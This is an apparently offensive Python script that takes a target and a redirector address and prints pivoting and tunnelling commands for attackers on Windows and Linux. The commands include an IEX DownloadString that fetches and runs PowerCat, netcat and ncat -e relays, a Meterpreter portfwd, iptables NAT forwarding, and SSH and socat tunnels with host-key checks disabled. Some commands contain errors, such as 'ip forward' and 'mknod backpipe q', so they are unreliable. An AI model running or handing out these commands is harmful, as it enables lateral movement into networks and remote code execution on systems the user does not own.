#!/usr/bin/python
from random import randint
from os import system
import socket

ip=raw_input ("What is the target IP? : ")
port=raw_input ("What is the target Port? : ")
Rip=raw_input ("What is the Redirectors IP? : ")

class bcolors:
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def MyIP():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

myip = MyIP()
randport = str(randint(32768, 65534))
system('clear')
print bcolors.WARNING + 'Windows Tunnels' + bcolors.ENDC
print bcolors.OKGREEN + 'Firewall PortForward:' + bcolors.ENDC
print 'netsh interface portproxy add v4tov4 listenport='+str(randint(32768, 65534)),' listenaddress='+(Rip), 'connectport='+(port),' connectaddress='+(ip)
print ('')
print bcolors.OKGREEN + 'Download PowerCat:' + bcolors.ENDC
print 'IEX (New-Object System.Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\')'
print 'powercat -c',(myip),'-p',(randport),'-r tcp:'+(ip)+':'+(port)
print bcolors.OKBLUE + 'Local Listener:' + bcolors.ENDC
print 'nc -l -p',str(randint(32768, 65534)), '0<backpipe | nc -l -p', (randport), 'tee backpipe' 

print ('')
print bcolors.OKGREEN + 'Meterpreter PortForward:' + bcolors.ENDC
print 'portfwd add -l '+str(randint(32768, 65534)),'-p',(port),'-r',(ip)
print ('')

print bcolors.WARNING + 'Linux Tunnels' + bcolors.ENDC
print bcolors.OKGREEN + 'Firewall PortForward:' + bcolors.ENDC
print 'sysctl net.ipv4.ip forward=1'
print 'iptables -t nat -A PREROUTING -p tcp -j DNAT --dport '+str(randint(32768, 65534)),'--to-destination ' +(ip)+':'+(port)
print 'iptables -t nat -A POSTROUTING -j MASQUERADE'
print ('')
print bcolors.OKGREEN + 'NetCat:' + bcolors.ENDC
print 'cd /tmp'
print 'mknod backpipe q'
print 'nc -v -l -p '+str(randint(32768, 65534)), '0<backpipe | nc '+(ip),(port), '| tee backpipe'
print ('')
print 'ncat -lvnk '+str(randint(32768, 65534)),'-e "/usr/bin/ncat',(ip),(port),'"' 
print ('')
print bcolors.OKGREEN + 'SSH Forward Tunnels:' + bcolors.ENDC
print 'ssh -v -x -fN -M -S /tmp/Rd.s root@'+(Rip), '-o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no"'
print 'ssh user@1.1.1.1 -Nf -S /tmp/Rd.s -L 0.0.0.0:'+str(randint(32768, 65534))+':'+(ip)+':'+(port)
print ('')
print bcolors.OKGREEN + 'SSH Dynamic Tunnels:' + bcolors.ENDC
print 'ssh /tmp/Rd.s user -Nf -D 0.0.0.0:1090'
print 'proxychains /bin/bash'
print 'socat UDP-listen:'+(port)+',reuseaddr,fork UDP:'+(ip)+':'+(port)+ ' &'
print 'socat tcp4-listen:'+(port)+',reuseaddr,fork tcp-4:'+(ip)+':'+(port)+ ' &'
print ('')


